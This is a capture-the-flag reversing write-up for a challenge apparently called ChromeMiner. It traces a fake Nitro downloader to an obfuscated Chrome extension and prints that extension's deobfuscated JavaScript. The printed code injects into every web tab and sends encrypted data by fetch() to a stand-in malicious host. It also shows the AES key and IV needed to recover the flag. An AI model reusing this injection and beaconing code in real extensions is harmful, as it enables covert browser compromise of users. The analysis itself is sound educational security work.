@@ -1,0 +1,146 @@
+#+TITLE: ChromeMiner
+#+AUTHOR: AsmArtisan256
+#+DATE: 01-02-2025
+
+#+OPTIONS: html-style:nil
+#+OPTIONS: html-scripts:nil
+
+#+OPTIONS: author:nil
+#+OPTIONS: email:nil
+#+OPTIONS: date:t
+#+OPTIONS: toc:nil
+
+#+PROPERTY: header-args :eval no
+
+#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="/style.css"/>
+
+#+EXPORT_FILE_NAME: chromeminer
+
+#+BEGIN_EXPORT html
+<p class="spacing-64" \>
+#+END_EXPORT
+
+#+TOC: headlines 2
+
+#+BEGIN_EXPORT html
+<p class="spacing-64" \>
+#+END_EXPORT
+
+
+This reversing challenge starts with a website that you can access after
+starting the instance. Nothing on the web page works, but if you check the page
+source, you can find a link to an =exe= file:
+~href="/static/nitro/DiscurdNitru.exe"~. If you open it in IDA Pro, you can see
+it's an extremely simple program that downloads a =ZIP= file extracts it to a
+directory and runs it. One of the strings has the path for the =ZIP= file:
+~/c2VjcmV0/archive.zip?k=ZGlzY3VyZG5~.
+
+After downloading the file and extracting the contents, there is a =JavaScript=
+file that is obviously obfuscated. It contains two gigantic lists with bytes
+that can be turned into plain text strings, being that the first step to
+deobfuscate the file. After understanding what each element of both lists
+represent, its as easy as using your Web Browser console to decode all the
+string concatenation happening and the partially (and decently) deobfuscated
+file will look like this:
+
+#+BEGIN_SRC javascript
+async function iF() {
+  if (!("injected" in document)) {
+    document["injected"] = true;
+    window["setInterval"](async () => {
+      y = new window["Uint8Array"](64);
+      window["crypto"]["getRandomValues"](y);
+      if (new window["TextDecoder"]("utf-8")["decode"](
+              await window["crypto"]["subtle"]["digest"](
+                  "sha-256", y))["endsWith"]("chrome")) {
+        j = new window["Uint8Array"](
+            y["ByteLength"] + (await window["crypto"]["subtle"]["digest"](
+                                  "sha-256", y))["byteLength"]);
+        j["set"](new window["Uint8Array"](y), 0);
+        j["set"](new window["Uint8Array"](
+                     await window["crypto"]["subtle"]["digest"]("sha-256", y)),
+                 y["byteLength"]);
+        window["fetch"](
+            "hxxps://qwertzuiop123.evil/" +
+            [...new window["Uint8Array"](
+                await window["crypto"]["subtle"]["encrypt"](
+                    {
+                      ["name"] : "AES-CBC",
+                      ["iv"] : new window["TextEncoder"]("utf-8")["encode"](
+                          "_NOT_THE_SECRET_")
+                    },
+                    await window["crypto"]["subtle"]["importKey"](
+                        "raw",
+                        await window["crypto"]["subtle"]["decrypt"](
+                            {
+                              ["name"] : "AES-CBC",
+                              ["iv"] :
+                                  new window["TextEncoder"]("utf-8")["encode"](
+                                      "_NOT_THE_SECRET_")
+                            },
+                            await window["crypto"]["subtle"]["importKey"](
+                                "raw",
+                                new window["TextEncoder"]("utf-8")["encode"](
+                                    "_NOT_THE_SECRET_"),
+                                {["name"] : "AES-CBC"}, true, [ "decrypt" ]),
+                            new window["Uint8Array"]((
+                                "E242E64261D21969F65F954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8")
+                                                         ["match"](
+                                                             /../g)["map"](
+                                                             h => window
+                                                                 ["parseInt"](
+                                                                     h, 16)))),
+                        {["name"] : "AES-CBC"}, true, [ "encrypt" ]),
+                    j)) ]["map"](
+                x => x["toString"](16)["padStart"](2, "0"))["join"](""));
+      }
+    }, 1);
+  }
+};
+
+chrome["tabs"]["onUpdated"]["addListener"]((tabVar, changeInfo, tab) => {
+  if ("url" in tab && tab["url"] != null &&
+      (tab["url"]["startsWith"]("https://") ||
+       tab["url"]["startsWith"]("http://"))) {
+    chrome["scripting"]["executeScript"](
+        {["target"] : {["tabId"] : tab["id"]}, function : iF});
+  }
+});
+#+END_SRC
+
+So, summarizing what this probably does when running: if you open a tab, it
+checks if the tab has a valid URL opened, and it will execute some kind of code
+that periodically generates a value, hashes it using =SHA-256= and verifies if the
+last set of characters spells "chrome". It also uses =AES-CBC= to encrypt and
+decrypt whatever, using the same =key= and =iv=: =_NOT_THE_SECRET_=. The encrypted
+string is
+=E242E64261D21969F65F954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8=,
+and the goal is to decrypt it using =AES-CBC= using the =key= and =iv= mentioned. You
+can do this in Python or even use any web tool and you will get the flag!
+
+
+* FOOTER                                                                                              :ignore:
+:PROPERTIES:
+:clearpage: t
+:END:
+#+BEGIN_EXPORT html
+<hr>
+<footer>
+  <div class="container">
+    <ul class="menu-list">
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/index.html">Home</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/articles/articles.html">Articles</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/writeups/htb/index.html">Write-Ups</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a class="inactive-link">01-02-2025</a>
+      </li>
+    </ul>
+  </div>
+</footer>
+#+END_EXPORT
